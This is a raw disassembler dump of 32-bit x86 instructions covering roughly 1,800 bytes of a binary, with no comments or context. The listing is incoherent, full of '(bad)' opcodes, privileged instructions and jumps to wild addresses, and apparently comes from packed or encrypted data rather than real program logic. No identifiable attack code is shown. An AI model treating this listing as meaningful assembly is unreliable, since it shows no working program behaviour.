  40b296:	or     bh,BYTE PTR [esi]
  40b298:	std    
  40b299:	mov    bh,BYTE PTR [edi+edx*2+0x22]
  40b29d:	xor    ah,BYTE PTR [edi+0x57930f7]
  40b2a3:	fdivr  st(0),st
  40b2a5:	lock cli 
  40b2a7:	jo     0x40b23d
  40b2a9:	rcr    BYTE PTR [edi+0x341ddf52],1
  40b2af:	test   DWORD PTR [edx+0xc],esp
  40b2b2:	sbb    al,0x9d
  40b2b4:	mov    ecx,0xf6ff51fa
  40b2b9:	(bad)  
  40b2bb:	enter  0x6390,0x34
  40b2bf:	imul   esi,DWORD PTR [ebx],0xaf4e6aa6
  40b2c5:	jl     0x40b267
  40b2c7:	retf   
  40b2c8:	icebp  
  40b2c9:	int3   
  40b2ca:	mov    esi,esi
  40b2cc:	inc    esp
  40b2cd:	inc    ebx
  40b2ce:	cmp    al,BYTE PTR [ebx+0x33]
  40b2d1:	(bad)  
  40b2d2:	xor    edx,edx
  40b2d4:	or     eax,edx
  40b2d6:	lea    eax,[ebp+eax*1-0x4]
  40b2da:	jmp    0x40b864
  40b2df:	dec    esp
  40b2e0:	outs   dx,DWORD PTR ds:[esi]
  40b2e1:	cdq    
  40b2e2:	js     0x40b27c
  40b2e4:	cmp    BYTE PTR [ebx+edx*1],ch
  40b2e7:	mov    ah,0x21
  40b2e9:	mov    al,0xae
  40b2eb:	iret   
  40b2ec:	mov    BYTE PTR [ebx],al
  40b2ee:	test   al,0xba
  40b2f0:	call   DWORD PTR [esi]
  40b2f2:	push   ss
  40b2f3:	cmp    eax,0xf8161604
  40b2f8:	or     edx,DWORD PTR [edx*1+0x123b65c0]
  40b2ff:	cmp    DWORD PTR [edi-0x62],edi
  40b302:	sbb    DWORD PTR [ecx-0x60b86c8e],eax
  40b308:	fcmovu st,st(2)
  40b30a:	mov    gs,WORD PTR [edx+0x16995e74]
  40b310:	bnd jmp 0xe4dc32b8
  40b316:	mov    ebx,0xd91117ec
  40b31b:	in     eax,0x80
  40b31d:	sbb    al,0x5f
  40b31f:	clc    
  40b320:	and    esi,DWORD PTR [ebx]
  40b322:	test   DWORD PTR [ebx],eax
  40b324:	add    bl,dh
  40b326:	call   0xda42e88d
  40b32b:	hlt    
  40b32c:	mov    al,ds:0x14baae9d
  40b331:	imul   eax,edx,0x7f4c8db1
  40b337:	xchg   esp,eax
  40b338:	mov    dh,0x64
  40b33a:	retw   
  40b33c:	sbb    dh,bh
  40b33e:	clc    
  40b33f:	jmp    0x23c5f568
  40b344:	fisub  WORD PTR [edi-0x80]
  40b347:	push   0xa3ceb313
  40b34c:	(bad)  
  40b34e:	(bad)  
  40b34f:	cld    
  40b350:	mov    DWORD PTR ss:[ebx+0x34],ebx
  40b354:	arpl   WORD PTR [ebx-0x24],dx
  40b357:	loop   0x40b373
  40b359:	jbe    0x40b2f2
  40b35b:	sub    al,0xd5
  40b35d:	xchg   DWORD PTR [ebx],ebx
  40b35f:	mov    ebx,0xf7e24130
  40b364:	rol    BYTE PTR [edx+0x9],cl
  40b367:	(bad)  [ebp-0x7bc1f9ef]
  40b36d:	mov    ecx,edi
  40b36f:	xchg   DWORD PTR [ecx+0x31],ecx
  40b372:	cdq    
  40b373:	das    
  40b374:	or     bl,BYTE PTR [eax+eax*1-0x2c]
  40b378:	pop    esp
  40b379:	sub    BYTE PTR [edx],bl
  40b37b:	dec    edi
  40b37c:	and    BYTE PTR [ecx-0x4d1f96f],ch
  40b382:	pop    ss
  40b383:	not    ebx
  40b385:	sbb    al,BYTE PTR [ebx+0x2e]
  40b388:	test   eax,0x703e6377
  40b38d:	aad    0xeb
  40b38f:	mov    BYTE PTR [edx-0x1e],ah
  40b392:	ret    0xb4ae
  40b395:	div    BYTE PTR [edx]
  40b397:	shl    DWORD PTR [eax-0x7fd3a206],cl
  40b39d:	sar    BYTE PTR [edi],1
  40b39f:	stos   DWORD PTR es:[edi],eax
  40b3a0:	xor    eax,0x2e9ad558
  40b3a5:	dec    edi
  40b3a6:	mov    al,0xf0
  40b3a8:	sbb    BYTE PTR [ebp-0xf],ch
  40b3ab:	mov    ?,ecx
  40b3ad:	push   ecx
  40b3ae:	add    al,0x2a
  40b3b0:	adc    eax,0x6186560e
  40b3b5:	dec    ecx
  40b3b6:	icebp  
  40b3b7:	in     eax,0xa5
  40b3b9:	mov    bh,0xf8
  40b3bb:	int3   
  40b3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3bd:	hlt    
  40b3be:	cld    
  40b3bf:	dec    ebp
  40b3c0:	aad    0x80
  40b3c2:	pop    edx
  40b3c3:	test   ah,ah
  40b3c5:	repz ffree st(5)
  40b3c8:	test   DWORD PTR [eax+eiz*8-0xa],ebp
  40b3cc:	pop    ebx
  40b3cd:	xchg   BYTE PTR [ebx-0x6b],ah
  40b3d0:	in     al,0x48
  40b3d2:	and    BYTE PTR [edx+eax*4],dl
  40b3d5:	lea    edx,[ebp+0xa]
  40b3d8:	sub    esp,DWORD PTR [edi-0x5f]
  40b3db:	(bad)  
  40b3dc:	cdq    
  40b3dd:	std    
  40b3de:	push   edx
  40b3df:	mov    ecx,0x8015f788
  40b3e4:	mov    al,ds:0xa4087231
  40b3e9:	inc    esp
  40b3ea:	call   0x5bbc:0x4318d7b3
  40b3f1:	(bad)  
  40b3f2:	dec    ebp
  40b3f3:	ret    
  40b3f4:	sahf   
  40b3f5:	sbb    BYTE PTR [ebp+0x24],bh
  40b3f8:	add    cl,BYTE PTR ds:0xb95c24f
  40b3fe:	(bad)  
  40b3ff:	sti    
  40b400:	mov    dh,0xb
  40b402:	jne    0x40b458
  40b404:	inc    eax
  40b405:	addr16 daa 
  40b407:	imul   eax,DWORD PTR [ecx],0xbdfdb29a
  40b40d:	loopne 0x40b445
  40b40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b410:	hlt    
  40b411:	or     eax,0x6be4d0e9
  40b416:	mov    ecx,0x97129c4c
  40b41b:	sub    ch,BYTE PTR [edx-0x5e6c64b9]
  40b421:	imul   esi,DWORD PTR [esi],0x4bfd9d77
  40b427:	fisttp DWORD PTR [ecx+0x11caa1f2]
  40b42d:	lods   eax,DWORD PTR ds:[esi]
  40b42e:	adc    eax,0xd2f41410
  40b433:	popa   
  40b434:	test   BYTE PTR [edx+0x2aa3bade],bl
  40b43a:	jl     0x40b4ab
  40b43c:	lods   al,BYTE PTR ds:[esi]
  40b43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b43e:	mov    esi,0x68d9d6a0
  40b443:	lds    ebp,FWORD PTR [eax+0x79]
  40b446:	cmp    al,0xc2
  40b448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b449:	sbb    DWORD PTR [eax+0x77],edi
  40b44c:	pop    ds
  40b44d:	jbe    0x40b400
  40b44f:	cli    
  40b450:	iret   
  40b451:	not    esp
  40b453:	cld    
  40b454:	fisubr WORD PTR [esi+0x7b]
  40b457:	and    BYTE PTR [ecx],ch
  40b459:	push   ebx
  40b45a:	xchg   BYTE PTR [esi+0x8a1522],ch
  40b460:	mov    eax,0x92d4d05f
  40b465:	rcl    BYTE PTR [edx+ebx*1-0x66bc1038],1
  40b46c:	loopne 0x40b4ce
  40b46e:	xlat   BYTE PTR ds:[ebx]
  40b46f:	test   DWORD PTR [eax+0x22],0x2f152699
  40b476:	sub    bh,0x48
  40b479:	in     al,dx
  40b47a:	cdq    
  40b47b:	je     0x40b4a3
  40b47d:	sbb    al,0x7d
  40b47f:	or     al,0xd7
  40b481:	dec    eax
  40b482:	out    dx,al
  40b483:	(bad)  
  40b484:	lock iret 
  40b486:	or     BYTE PTR [ebx-0x62],dh
  40b489:	into   
  40b48a:	xchg   DWORD PTR [edx],edx
  40b48c:	retf   
  40b48d:	mov    al,0xe7
  40b48f:	rol    BYTE PTR [ebp-0x646712ab],cl
  40b495:	retf   0x861c
  40b498:	push   ebp
  40b499:	fild   DWORD PTR [esi+0x72176831]
  40b49f:	addr16 jmp 0x15c3:0xef7a3d5e
  40b4a7:	xchg   ecx,eax
  40b4a8:	sar    DWORD PTR [ebx-0x43d1ff2e],cl
  40b4ae:	mov    dh,ah
  40b4b0:	xor    edx,0x833a1889
  40b4b6:	mov    eax,0x2a3e6439
  40b4bb:	mov    edx,DWORD PTR [ecx+0x30]
  40b4be:	jg     0x40b518
  40b4c0:	mov    eax,0x47787821
  40b4c5:	rol    BYTE PTR [eax],1
  40b4c7:	pop    ebx
  40b4c9:	in     al,dx
  40b4ca:	pop    ebx
  40b4cb:	pop    esp
  40b4cc:	jnp    0x40b458
  40b4ce:	cdq    
  40b4cf:	xor    cl,dl
  40b4d1:	mov    esp,0x41d9b214
  40b4d6:	mov    al,gs:0x446239bf
  40b4dc:	and    ah,bh
  40b4de:	sbb    al,0x46
  40b4e0:	pop    esi
  40b4e1:	iret   
  40b4e2:	mov    dh,0x1b
  40b4e4:	lods   al,BYTE PTR ds:[esi]
  40b4e5:	stc    
  40b4e6:	cld    
  40b4e7:	xchg   ecx,eax
  40b4e8:	mov    ebp,ebp
  40b4ea:	push   eax
  40b4eb:	stos   DWORD PTR es:[edi],eax
  40b4ec:	(bad)  
  40b4ed:	not    DWORD PTR [esi+0x15]
  40b4f0:	mov    edx,0xc6fa05c4
  40b4f5:	sub    BYTE PTR ds:0xea72862d,0xbc
  40b4fc:	pushf  
  40b4fd:	push   ecx
  40b4fe:	pusha  
  40b4ff:	(bad)  
  40b500:	sti    
  40b501:	add    ah,cl
  40b503:	mov    edi,0x4517e496
  40b508:	xchg   edi,eax
  40b509:	adc    ch,BYTE PTR [ebx-0x2e9157cd]
  40b50f:	cld    
  40b510:	loop   0x40b4b7
  40b512:	les    ebp,FWORD PTR [edi+0x15]
  40b515:	adc    DWORD PTR [esi],esi
  40b517:	sahf   
  40b518:	fldenv [edx+0x25]
  40b51b:	push   es
  40b51c:	sahf   
  40b51d:	cwde   
  40b51e:	xor    al,0x36
  40b520:	ror    DWORD PTR [esi-0x2207fef7],0x1
  40b527:	mov    BYTE PTR [ecx],ch
  40b529:	inc    esi
  40b52a:	aas    
  40b52b:	xchg   edx,eax
  40b52c:	xchg   edx,eax
  40b52d:	mov    ds:0x1d3405a1,al
  40b532:	loopne 0x40b5ab
  40b534:	dec    ecx
  40b535:	xchg   edi,eax
  40b536:	pop    ebp
  40b537:	iret   
  40b538:	mov    ch,BYTE PTR [ecx-0x49]
  40b53b:	mov    al,0xb6
  40b53d:	or     eax,0xbf0fddfc
  40b542:	sbb    eax,0x4d2a42ed
  40b547:	ret    
  40b548:	push   es
  40b549:	ret    
  40b54a:	out    dx,al
  40b54b:	pop    es
  40b54c:	inc    edi
  40b54d:	lock dec edx
  40b54f:	pop    ebp
  40b550:	mov    ebp,0x820f684a
  40b555:	adc    edi,DWORD PTR [esi-0x64]
  40b558:	fcom   QWORD PTR [esi]
  40b55a:	bound  edi,QWORD PTR [ecx-0x76]
  40b55d:	icebp  
  40b55e:	add    ah,BYTE PTR [ebp+0x1f7c7e5]
  40b564:	movlps xmm7,QWORD PTR [edi]
  40b567:	jg     0x40b514
  40b569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b56a:	mov    bl,0x7a
  40b56c:	xchg   DWORD PTR [ebx],esi
  40b56e:	add    al,0xe4
  40b570:	dec    ecx
  40b571:	sti    
  40b572:	sub    BYTE PTR [ecx+0x6e],bh
  40b575:	xor    BYTE PTR [bx-0x3d],dh
  40b579:	sub    edi,eax
  40b57b:	jg     0x40b58c
  40b57d:	push   ds
  40b57e:	scas   eax,DWORD PTR es:[edi]
  40b57f:	add    ebx,DWORD PTR [esi-0x1192c5cc]
  40b585:	or     BYTE PTR [eax],dh
  40b587:	sub    ecx,edx
  40b589:	mov    ch,0x2
  40b58b:	push   0xb581e9d
  40b590:	adc    DWORD PTR [edx+0x34b021dd],0xffffff9c
  40b597:	psadbw mm7,QWORD PTR [ebx]
  40b59a:	mov    ds:0x7bcd1321,eax
  40b59f:	sti    
  40b5a0:	xchg   ebx,eax
  40b5a1:	hlt    
  40b5a2:	(bad)  
  40b5a3:	or     eax,0x6f6cda13
  40b5a8:	sub    eax,0x2b7978dc
  40b5ad:	mov    edi,ebp
  40b5af:	or     BYTE PTR [eax+0x1a],0x1
  40b5b3:	jns    0x40b62f
  40b5b5:	std    
  40b5b6:	sbb    esi,DWORD PTR [edi+0x23]
  40b5b9:	adc    esi,esp
  40b5bb:	push   ebx
  40b5bc:	icebp  
  40b5bd:	loop   0x40b639
  40b5bf:	jl     0x40b547
  40b5c1:	or     eax,0xd698e3a0
  40b5c6:	jp     0x40b63e
  40b5c8:	cwde   
  40b5c9:	xor    BYTE PTR [esp+ebx*2],al
  40b5cc:	xor    DWORD PTR [ecx],esp
  40b5ce:	sbb    al,bl
  40b5d0:	pushf  
  40b5d1:	stos   DWORD PTR es:[edi],eax
  40b5d2:	lea    edx,[ecx-0x43]
  40b5d5:	ficom  WORD PTR [edx+0x791ef796]
  40b5db:	aam    0x72
  40b5dd:	mov    WORD PTR [ebp+0x2],fs
  40b5e0:	ror    ebp,cl
  40b5e2:	icebp  
  40b5e3:	dec    ebx
  40b5e4:	cdq    
  40b5e5:	ds xchg ebp,eax
  40b5e7:	and    dh,cl
  40b5e9:	pop    esi
  40b5ea:	arpl   WORD PTR [ebx+0xafba0d],sp
  40b5f0:	in     al,dx
  40b5f1:	and    esi,DWORD PTR [ebp+0x3895ab02]
  40b5f7:	sub    ebx,DWORD PTR [ecx-0x60]
  40b5fa:	sbb    eax,DWORD PTR [edx+0xe]
  40b5fd:	xchg   esi,eax
  40b5fe:	mov    bh,0xe4
  40b600:	bndldx bnd3,[edi+eax*1+0x732327b2]
  40b608:	lods   al,BYTE PTR ds:[esi]
  40b609:	loope  0x40b677
  40b60b:	adc    eax,0x9260e420
  40b610:	repnz inc edi
  40b612:	repnz (bad) 
  40b614:	in     al,0xaf
  40b616:	lahf   
  40b617:	inc    edx
  40b618:	(bad)  
  40b619:	inc    esi
  40b61a:	pop    edi
  40b61b:	fsub   DWORD PTR [ecx]
  40b61d:	xchg   esp,eax
  40b61e:	dec    ecx
  40b61f:	or     DWORD PTR [ebx-0x3e4c4b38],esp
  40b625:	rol    DWORD PTR [edx+0x14],cl
  40b628:	sbb    BYTE PTR [ecx+0x1d2aa778],dl
  40b62e:	mov    eax,ds:0xe2655ae9
  40b633:	add    DWORD PTR [edx],esp
  40b635:	dec    eax
  40b636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b637:	fimul  WORD PTR [ecx]
  40b639:	daa    
  40b63a:	loope  0x40b6ac
  40b63c:	adc    BYTE PTR [eax+0x4b],ah
  40b63f:	sbb    al,0x41
  40b641:	leave  
  40b642:	fcomip st,st(2)
  40b644:	xchg   ecx,eax
  40b645:	cli    
  40b646:	ret    
  40b647:	add    esi,esi
  40b649:	jmp    0x86b1:0xedeb9335
  40b650:	in     eax,dx
  40b651:	popa   
  40b652:	dec    esp
  40b653:	push   es
  40b654:	adc    bh,BYTE PTR [ecx+0x3489a01a]
  40b65a:	call   0x87ec1401
  40b65f:	jo     0x40b60e
  40b661:	aam    0x5f
  40b663:	mov    al,0xe8
  40b665:	or     DWORD PTR [ebx-0x3f4c40ae],eax
  40b66b:	repz je 0x40b612
  40b66e:	cmp    BYTE PTR [edx+0x3c4be370],bl
  40b674:	pop    esp
  40b675:	mov    WORD PTR [edi],?
  40b677:	mov    cl,0x57
  40b679:	pop    edi
  40b67a:	mov    bh,0x5a
  40b67c:	mov    ecx,DWORD PTR [ebp-0x3ae5d835]
  40b682:	cli    
  40b683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b684:	aam    0xb1
  40b686:	mov    DWORD PTR [esi-0x66],edi
  40b689:	(bad)  
  40b68a:	push   eax
  40b68b:	adc    ah,dh
  40b68d:	rol    BYTE PTR [ebp-0x78a369fe],1
  40b693:	leave  
  40b694:	or     eax,0x61f98eb6
  40b699:	rcr    DWORD PTR [eax],0xf0
  40b69c:	mov    ecx,0x683460d7
  40b6a1:	retf   
  40b6a2:	(bad)  
  40b6a3:	shr    BYTE PTR [ebp-0x51589dbb],cl
  40b6a9:	adc    cl,BYTE PTR [eax]
  40b6ab:	push   edx
  40b6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ad:	mov    ebp,DWORD PTR [ebx]
  40b6af:	aad    0x26
  40b6b1:	je     0x40b63f
  40b6b3:	xchg   ebp,eax
  40b6b4:	repz pop ds
  40b6b6:	pop    edx
  40b6b7:	popf   
  40b6b8:	pop    ebx
  40b6b9:	xchg   esi,eax
  40b6ba:	ins    BYTE PTR es:[edi],dx
  40b6bb:	push   ds
  40b6bc:	int3   
  40b6bd:	mov    edx,0x901d0043
  40b6c2:	sub    eax,DWORD PTR [esi+0x60]
  40b6c5:	in     eax,0x4c
  40b6c7:	fdiv   QWORD PTR [ebp+0x264adc1c]
  40b6cd:	mov    edi,0x9e5f77d0
  40b6d2:	das    
  40b6d3:	dec    edx
  40b6d4:	dec    edi
  40b6d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d6:	sbb    ch,ah
  40b6d8:	push   esi
  40b6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6da:	mov    esi,0x3e3d07a2
  40b6df:	push   edi
  40b6e0:	data16 int 0xf2
  40b6e3:	and    BYTE PTR [esi],0xec
  40b6e6:	cmp    dh,BYTE PTR [eax]
  40b6e8:	in     al,dx
  40b6e9:	bound  edx,QWORD PTR [ecx+0x7f6a5bb5]
  40b6ef:	jnp    0x40b67e
  40b6f1:	popf   
  40b6f2:	push   cs
  40b6f3:	inc    ecx
  40b6f4:	lahf   
  40b6f5:	call   0x65b5:0x182ca073
  40b6fc:	popa   
  40b6fd:	sub    DWORD PTR [esi+0x52],0x5f678a59
  40b704:	hlt    
  40b705:	xchg   ebx,eax
  40b706:	(bad)  
  40b707:	jne    0x40b6a8
  40b709:	mov    al,ds:0x3931566a
  40b70e:	cmp    ch,BYTE PTR [edi]
  40b710:	je     0x40b71f
  40b712:	or     ch,BYTE PTR [edi+0x3b]
  40b715:	outs   dx,BYTE PTR ds:[esi]
  40b716:	(bad)  [eax-0x6d]
  40b719:	mov    ah,0xa6
  40b71b:	lods   al,BYTE PTR ds:[esi]
  40b71c:	push   cs
  40b71d:	sub    al,0x6d
  40b71f:	shr    DWORD PTR [ecx-0x3a],cl
  40b722:	jns    0x40b6b1
  40b724:	aaa    
  40b725:	adc    al,0x3a
  40b727:	in     al,0x37
  40b729:	cmp    ah,BYTE PTR [esi-0x78]
  40b72c:	pop    ecx
  40b72d:	push   eax
  40b72e:	ds mov al,0x51
  40b731:	aas    
  40b732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b733:	imul   ecx,DWORD PTR [esi-0x42],0xb48e78cb
  40b73a:	iret   
  40b73b:	enter  0x4f0d,0xae
  40b73f:	push   edx
  40b740:	xor    ebp,esp
  40b742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b743:	pop    ss
  40b744:	jne    0x40b776
  40b746:	in     eax,dx
  40b747:	(bad)  [ebp-0x79]
  40b74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b74b:	retf   0x58d3
  40b74e:	mov    cl,0x95
  40b750:	sbb    BYTE PTR [edx+esi*1+0x1c],ah
  40b754:	fcomp  DWORD PTR ds:0xa991c74f
  40b75a:	mov    bh,0xd7
  40b75c:	aas    
  40b75d:	les    ebx,FWORD PTR [esi]
  40b75f:	pop    ss
  40b760:	imul   edi,DWORD PTR [esp+edi*1-0x6f],0xb3da0dd3
  40b768:	mov    ds:0xe10b984d,al
  40b76d:	pop    edi
  40b76e:	xor    eax,0x441d640a
  40b773:	jne    0x40b700
  40b775:	lods   al,BYTE PTR ds:[esi]
  40b776:	retf   0x5b9f
  40b779:	ror    BYTE PTR [edx],1
  40b77b:	sbb    DWORD PTR [esp+ecx*1+0x85ead87],ebx
  40b782:	daa    
  40b783:	neg    DWORD PTR [ebx+0x5f131323]
  40b789:	add    eax,0x5b3b21f8
  40b78e:	and    al,0x1b
  40b790:	int3   
  40b791:	popf   
  40b792:	test   al,0x4
  40b794:	pop    ds
  40b795:	jge    0x40b779
  40b797:	mov    ds:0xca7ff1c7,eax
  40b79c:	jbe    0x40b724
  40b79e:	push   es
  40b79f:	(bad)  
  40b7a0:	mov    ebp,0xb5182405
  40b7a5:	(bad)  
  40b7a6:	fbstp  TBYTE PTR [edi+0x15]
  40b7a9:	jmp    0x40b789
  40b7ab:	jecxz  0x40b735
  40b7ad:	jmp    0x40b7fc
  40b7af:	push   cs
  40b7b0:	dec    edx
  40b7b1:	xchg   esp,eax
  40b7b2:	inc    edx
  40b7b3:	push   edx
  40b7b4:	adc    eax,0x6d22697c
  40b7b9:	stos   BYTE PTR es:[edi],al
  40b7ba:	mov    dl,0x32
  40b7bc:	lahf   
  40b7bd:	sub    eax,0xc6ca30c9
  40b7c2:	inc    esp
  40b7c3:	das    
  40b7c4:	inc    edx
  40b7c5:	enter  0xbe4a,0x64
  40b7c9:	xlat   BYTE PTR ds:[ebx]
  40b7ca:	inc    esp
  40b7cb:	and    al,0xcf
  40b7cd:	icebp  
  40b7ce:	and    al,0xd0
  40b7d0:	mov    edi,0x1b235dd5
  40b7d5:	mov    dl,0x2f
  40b7d7:	inc    ebp
  40b7d8:	daa    
  40b7d9:	mov    ?,WORD PTR [ecx+eax*2+0x4c1dc7e8]
  40b7e0:	mov    eax,ds:0xd67466f0
  40b7e5:	and    al,0xdf
  40b7e7:	or     al,0xf0
  40b7e9:	push   esp
  40b7ea:	sbb    esi,DWORD PTR [edi+0x2bf26151]
  40b7f0:	int    0x83
  40b7f2:	xchg   DWORD PTR [ebx],esp
  40b7f4:	pop    edx
  40b7f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f6:	lods   al,BYTE PTR ds:[esi]
  40b7f7:	pusha  
  40b7f8:	lods   eax,DWORD PTR ds:[esi]
  40b7f9:	add    ecx,DWORD PTR [ebx+0x3745a220]
  40b7ff:	call   0xe94caa30
  40b804:	jnp    0x40b7ff
  40b806:	inc    ecx
  40b807:	aam    0x71
  40b809:	retf   0xfee1
  40b80c:	repnz fmul DWORD PTR [edx]
  40b80f:	dec    ebx
  40b810:	lods   eax,DWORD PTR ds:[esi]
  40b811:	imul   eax,eax,0xffffffae
  40b814:	xchg   ebp,eax
  40b815:	cmp    ah,ah
  40b817:	icebp  
  40b818:	rol    BYTE PTR [esi],1
  40b81a:	fcomp  DWORD PTR [edi+0x31]
  40b81d:	call   0x50b5:0x722c262
  40b824:	mov    dl,0xc4
  40b826:	jns    0x40b899
  40b828:	mov    dl,0x3d
  40b82a:	adc    dl,ch
  40b82c:	pop    ds
  40b82d:	or     edi,ecx
  40b82f:	or     BYTE PTR [ecx+0x3c76c959],0x9c
  40b836:	cmp    dl,BYTE PTR [ebx]
  40b838:	shl    esp,1
  40b83a:	int3   
  40b83b:	pop    es
  40b83c:	cs push 0x67
  40b83f:	pop    edi
  40b840:	loop   0x40b887
  40b842:	jnp    0x40b85b
  40b844:	ret    
  40b845:	and    eax,0x6899cd65
  40b84a:	cmp    DWORD PTR [eax-0x29afb299],edi
  40b850:	mov    ds:0xf2a237e0,al
  40b855:	clc    
  40b856:	fsincos 
  40b858:	sbb    dl,ah
  40b85a:	or     ebp,edx
  40b85c:	inc    ecx
  40b85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b85e:	enter  0x1e89,0x3b
  40b862:	cs test eax,0x8bcc4589
  40b868:	inc    ebp
  40b869:	mov    al,ds:0x8b1ee1c1
  40b86e:	dec    ebp
  40b86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b870:	jmp    0x40bdfa
  40b875:	retf   
  40b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b877:	cli    
  40b878:	jo     0x40b852
  40b87a:	sbb    BYTE PTR [eax],ah
  40b87c:	and    al,0xe8
  40b87e:	ins    BYTE PTR es:[edi],dx
  40b87f:	mov    ah,0x72
  40b881:	jmp    0x40b85e
  40b883:	add    eax,0x16ebf0a8
  40b888:	push   ss
  40b889:	cmp    eax,0x68161604
  40b88e:	sub    dl,BYTE PTR cs:0xea47c5dd
  40b895:	pop    ss
  40b896:	push   esi
  40b897:	mov    ds:0xdf6c6916,al
  40b89c:	mov    edx,DWORD PTR [esi-0x2b343591]
  40b8a2:	div    DWORD PTR [ebx+0x7c]
  40b8a5:	add    dl,BYTE PTR [ebp-0x98bd6ba]
  40b8ab:	fcomp  DWORD PTR [eax]
  40b8ad:	mov    esi,0xe6bffda4
  40b8b2:	aas    
  40b8b3:	xchg   esi,eax
  40b8b4:	stos   DWORD PTR es:[edi],eax
  40b8b5:	and    edx,eax
  40b8b7:	xchg   edx,eax
  40b8b8:	mov    ebx,0x63c4e87e
  40b8bd:	mov    WORD PTR [ebx-0x75],fs
  40b8c0:	xor    eax,0x54defe36
  40b8c5:	pop    esi
  40b8c6:	cmc    
  40b8c7:	inc    ebp
  40b8c8:	stos   DWORD PTR es:[edi],eax
  40b8c9:	pop    esp
  40b8ca:	push   eax
  40b8cb:	cwde   
  40b8cc:	aad    0xc5
  40b8ce:	mov    BYTE PTR [ebx+0x39],ah
  40b8d1:	xchg   ebx,eax
  40b8d2:	xchg   ebx,eax
  40b8d3:	ror    DWORD PTR [edx+0x6b707430],cl
  40b8d9:	test   eax,0xf219c131
  40b8de:	and    BYTE PTR [edi],bl
  40b8e0:	daa    
  40b8e1:	ror    cl,cl
  40b8e3:	xor    BYTE PTR [esi+0x1aba09f3],0xc2
  40b8ea:	push   es
  40b8eb:	loopne 0x40b8c0
  40b8ed:	jnp    0x40b918
  40b8ef:	pop    esi
  40b8f0:	lods   al,BYTE PTR ds:[esi]
  40b8f1:	dec    esp
  40b8f2:	fist   DWORD PTR [esi-0xf]
  40b8f5:	cmp    DWORD PTR [edi+0x2bc40e46],eax
  40b8fb:	outs   dx,BYTE PTR ds:[esi]
  40b8fc:	sub    eax,0x7c3a011e
  40b901:	inc    ecx
  40b902:	push   edx
  40b903:	imul   esp,ebp,0x5f
  40b906:	(bad)  
  40b907:	fwait
  40b908:	and    edi,DWORD PTR [edi]
  40b90a:	test   eax,0x993f9e53
  40b90f:	fs mov cl,0xa4
  40b912:	push   ebp
  40b913:	add    al,BYTE PTR [ebx]
  40b915:	lock cmp eax,0xcb0677cd
  40b91b:	and    BYTE PTR [ecx+0x44a7d1b2],ch
  40b921:	test   BYTE PTR [edx-0x71],cl
  40b924:	push   edx
  40b925:	sti    
  40b926:	or     edi,esp
  40b928:	shl    dh,cl
  40b92a:	push   cs
  40b92b:	fld    TBYTE PTR [ebx-0x1204c4e9]
  40b931:	leave  
  40b932:	retf   0xba1c
  40b935:	mov    WORD PTR [edx],es
  40b937:	retf   0xe875
  40b93a:	jae    0x40b946
  40b93c:	push   edi
  40b93d:	inc    ecx
  40b93e:	cld    
  40b93f:	idiv   DWORD PTR [eax+0xb]
  40b942:	icebp  
  40b943:	imul   eax,DWORD PTR [edi],0x68
  40b946:	dec    ebp
  40b947:	(bad)  
  40b948:	xor    BYTE PTR [esi],al
  40b94a:	jbe    0x40b957
  40b94c:	jae    0x40b959
  40b94e:	(bad)  
  40b94f:	jmp    0x40b988
  40b951:	and    al,BYTE PTR [esi+ebx*4]
  40b954:	dec    ecx
  40b955:	(bad)  
  40b956:	xor    ebp,DWORD PTR [edx+0x14e2c9fe]
  40b95c:	inc    esp
  40b95d:	not    DWORD PTR [esi+0x3cd8d6f5]
  40b963:	es xor dl,ah
  40b966:	push   0x8dd6e472
  40b96b:	push   ebp
  40b96c:	(bad)  
  40b96d:	pushf  
  40b96e:	ins    BYTE PTR es:[edi],dx
  40b96f:	inc    esi
  40b970:	div    BYTE PTR [eax+0x23]
  40b973:	mov    eax,0xe443645
  40b978:	mov    gs,esi
  40b97a:	ss jns 0x40b9e0
  40b97d:	js     0x40b93a
  40b97f:	jg     0x40b920
  40b981:	jne    0x40b920
  40b983:	lahf   
  40b984:	xor    ah,BYTE PTR [esi+0x0]
  40b987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b988:	sub    al,0xb7
  40b98a:	adc    al,0x89
  40b98d:	mov    dh,0x68
  40b98f:	add    eax,0x7f0dd14d
  40b994:	iret   
  40b995:	and    eax,0x5c0ced84
  40b99a:	pop    edi
  40b99b:	call   0x9f8c:0xb9637b8b
  40b9a2:	loop   0x40b9cc
  40b9a4:	pop    esp
  40b9a5:	out    dx,eax
  40b9a6:	mov    DWORD PTR [edi],ebx
  40b9a8:	stos   DWORD PTR es:[edi],eax
  40b9a9:	stos   BYTE PTR es:[edi],al
  40b9aa:	aaa    
  40b9ab:	aaa    
  40b9ac:	scas   eax,DWORD PTR es:[edi]
  40b9ad:	loopne 0x40ba2c
  40b9af:	cs fucomip st,st(4)
  40b9b2:	pop    edi
  40b9b3:	inc    edx
  40b9b4:	pop    ss
  40b9b5:	lods   eax,DWORD PTR ds:[esi]
  40b9b6:	jecxz  0x40ba0a
  40b9b8:	dec    edi
  40b9b9:	pop    esi
  40b9ba:	sub    DWORD PTR ds:0xe888e7c1,edi
  40b9c0:	pusha  
  40b9c1:	fbld   TBYTE PTR [eax-0x56353aa2]
  40b9c7:	add    dh,BYTE PTR [edx+0x4b9c026f]
  40b9cd:	xchg   ebx,eax
  40b9ce:	(bad)  
  40b9cf:	retf   
  40b9d0:	(bad)
  40b9d4:	jge    0x40b9cc
  40b9d6:	mov    eax,0x73594b83
  40b9db:	aam    0x45
